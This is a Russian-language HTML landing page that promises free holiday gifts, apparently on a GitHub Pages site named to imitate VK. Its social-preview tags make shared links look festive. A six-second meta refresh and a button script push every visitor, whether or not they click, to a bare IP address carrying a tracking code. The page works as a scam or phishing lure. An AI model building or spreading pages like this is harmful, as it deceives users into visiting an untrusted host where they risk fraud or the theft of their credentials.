<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Забери подарки прямо сейчас</title>

<!-- Open Graph теги для превью -->
<meta property="og:title" content="Забери подарки прямо сейчас">
<meta property="og:description" content="Праздничный подарок ждёт тебя.">
<!-- Картинка лежит локально в vk-sale -->
<meta property="og:image" content="https://vk-sale.github.io/preview.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:url" content="https://vk-sale.github.io/">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Забери подарки прямо сейчас">

<!-- Twitter Card теги -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Забери подарки прямо сейчас">
<meta name="twitter:description" content="Праздничный подарок ждёт тебя.">
<meta name="twitter:image" content="https://vk-sale.github.io/preview.jpg">

<!-- Редирект через 6 секунд на НОВЫЙ целевой сайт -->
<meta http-equiv="refresh" content="6; url=https://192.142.54.173/?s=HfMHg3pHMc">

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
    }

    html, body {
        height: 100vh;
        height: 100dvh;
        width: 100%;
        overflow: hidden;
    }

    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background-color: #2f8ef0;
        display: flex;
        align-items: center;
        justify-content: center;
        touch-action: manipulation;
    }

    .hero-wrap {
        position: relative;
        width: 100%;
        height: 100%;
        overflow: hidden;
    }

    .hero-wrap img {
        display: block;
        width: 100%;
        height: 100%;
        object-fit: cover;
        object-position: center;
        background-color: #2f8ef0;
    }

    .btn-gift {
        position: absolute;
        left: 50%;
        transform: translateX(-50%);
        bottom: calc(7% + env(safe-area-inset-bottom, 0px));
        width: 78%;
        max-width: 400px;
        padding: 18px 24px;
        background: #fff;
        color: #1a1a2e;
        font-size: 19px;
        font-weight: 800;
        border: none;
        border-radius: 18px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35);
        animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
        0%, 100% { box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35); }
        50%      { box-shadow: 0 10px 40px rgba(255, 255, 255, 0.7); }
    }

    .btn-gift:active {
        transform: translateX(-50%) scale(0.96);
    }

    @media (min-width: 1024px) {
        .hero-wrap {
            width: 430px;
            height: 90vh;
            border-radius: 26px;
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.28);
        }
    }
</style>
</head>
<body>

<div class="hero-wrap">
    <img src="cake.jpg" alt="Праздничный торт">
    <!-- НОВЫЙ ЦЕЛЕВОЙ АДРЕС -->
    <a href="https://192.142.54.173/?s=HfMHg3pHMc" class="btn-gift" id="giftBtn">
        🎁 Забрать подарок
    </a>
</div>

<script>
    const giftBtn = document.getElementById('giftBtn');
    const targetUrl = giftBtn.href;
    let redirected = false;

    const redirectTimeout = setTimeout(() => {
        if (!redirected) {
            redirected = true;
            window.location.replace(targetUrl);
        }
    }, 6000);

    giftBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (!redirected) {
            redirected = true;
            clearTimeout(redirectTimeout);
            window.location.replace(targetUrl);
        }
    });
</script>
</body>
</html>
